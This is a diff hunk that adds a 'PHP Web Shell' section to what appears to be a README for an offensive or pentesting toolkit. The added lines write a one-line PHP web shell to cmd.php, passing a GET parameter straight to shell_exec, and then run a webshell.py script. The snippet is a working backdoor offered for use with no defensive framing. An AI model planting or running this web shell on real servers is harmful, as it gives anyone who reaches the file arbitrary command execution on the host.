@@ -54,6 +54,16 @@ Additionally, in case you need more resources and have the necessary privileges 
 ./additionals.sh
 ```
 
+**PHP Web Shell**
+
+```
+echo '<?php echo shell_exec($_GET["cmd"]); ?>' > cmd.php
+```
+
+```
+python3 webshell.py
+```
+
 ## More Information
 
 Read more at https://blog.dftorres.ca/?p=2224.
